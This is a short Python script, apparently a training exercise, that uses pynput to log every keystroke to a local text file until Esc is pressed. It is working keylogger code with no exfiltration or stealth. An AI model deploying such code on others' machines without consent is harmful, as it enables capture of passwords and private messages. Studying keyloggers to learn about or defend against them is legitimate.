import pynput
from pynput.keyboard import Key, Listener

log_file = "PRODIGY_CS_04_key_log.txt"

def on_press(key):
    with open(log_file, "a") as log:
        try:
            log.write(f"{key.char}\n")
        except AttributeError:
            log.write(f"{key}\n")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()